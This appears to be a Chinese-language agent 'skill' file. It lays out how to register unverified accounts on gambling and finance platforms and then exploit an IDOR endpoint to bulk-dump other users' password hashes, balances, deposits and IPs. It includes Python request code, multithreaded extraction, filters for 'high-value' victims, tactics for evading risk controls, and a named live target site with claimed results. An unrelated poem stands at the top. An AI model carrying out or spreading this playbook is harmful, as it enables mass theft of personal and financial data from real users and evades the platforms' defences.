---
name: 报名·横夺
description: "注册绕过IDOR数据提取: 平台注册无验证时→注册账号→内部视角IDOR批量拖库。"
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [idor, registration, bypass, pentest, data-extraction]
    category: ctf-pentest
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

# 注册绕过 IDOR 数据提取

## 触发条件
- 目标平台有注册功能且**无需验证码/邮箱/手机验证**
- 目标有 IDOR/BOLA 端点但需要登录 session
- 代理池拖库太慢/被CF风控，需要更快的数据提取方式

## 核心原理

许多平台（尤其是博彩/游戏/金融类）的注册接口**不验证用户身份**——只需 username + password 即可注册成功。注册后自动获得一个合法 session，这个 session 可以用来访问需要登录的 API 端点。

如果该平台同时存在 IDOR 漏洞（未校验用户权限的 API），**新注册的普通账号也能触发 IDOR**，无需特殊权限。

## 工作流

### 1. 检测注册是否需要验证
```bash
POST /api/register
参数: username + password + confirmPassword
```
- 返回 `{"code":0,"msg":"成功"}` = 注册无需验证 → 可直接使用
- 返回 验证码/邮箱/手机相关错误 = 需要验证 → 走其他路径

### 2. 注册 + 登录
```python
# 注册
requests.post(url + "/api/register", data={"username": uname, "password": pwd, "confirmPassword": pwd})
# 登录 (拿cookie + loginUid)
requests.post(url + "/api/accountLogin", data={"username": uname, "password": pwd})
# 提取 loginUid 从 HTML
import re
loginUid = re.search(r"loginUid = '([0-9a-f]+)'", html).group(1)
```

### 3. 用新账号触发 IDOR
```bash
POST /api/refreshUserInfo
body: loginUid=<新会话>&userId=<任意用户ID>
# 返回: 密码哈希, 余额, 充值, TG身份, 注册IP等
```
- 新账号的 session 可以查**全库任意用户**的数据
- **不依赖任何特定权限**——普通注册账号即可

### 4. 批量数据提取
- **单线程慢扫**: 每个请求 0.3-0.5s 延迟，避免触发风控
- **多线程并行**: 8-10 线程，每个线程处理不同 ID 区间
- **去重续跑**: 每次启动读取已有文件去重，支持断点续跑
- **高价值筛选**: 实时打印充值>1万/余额>1000的高价值用户

### 5. 与代理池拖库对比

| 方法 | 速度 | 抗风控 | 适用场景 |
|---|---|---|---|
| 代理池+新会话 | 慢 (1 req/1.2s/代理) | 强 (IP轮换) | CF 防护、无注册入口 |
| 注册账号+IDOR | 快 (0.3s/req, 10线程) | 中 (单IP) | 有注册且无验证码 |
| 最佳实践 | 两者结合 | 注册账号扫低区间, 代理池补高区间 |

## 实战案例: dbyl.ph 夺宝娱乐

**注册接口**: `POST /api/register` (无验证码)
**IDOR 接口**: `POST /api/refreshUserInfo` (任意 userId)
**成果**: 新注册账号 → 10 分钟扫完 1000 个代理账号 → 1.66亿 USDT 流水

详见 `references/dbyl-case-study.md`

## 注意事项

### 注册接口的陷阱
- 密码可能被前端预处理（MD5/SHA256），但大多数平台存明文
- 有些平台注册后需要额外激活步骤（如邮箱验证）→ 不适用
- 确保 username 唯一（加随机后缀）

### IDOR 的陷阱
- 部分接口只读不写（IDOR 读数据，写操作会话绑定）
- 新账号的 loginUid 每次登录变化——每次请求前重新提取
- 有些平台 userId 不是连续数字——需要先枚举可用 ID

### 风控规避
- 注册频率不要太高（每分钟 1-2 个）
- 登录后先做几个正常操作（浏览页面）再触发 IDOR
- 批量请求间加 0.2-0.5s 延迟
- 错误率 > 50% 时停止，换 IP 重试

## 参考
- `references/dbyl-case-study.md` — 夺宝娱乐实战案例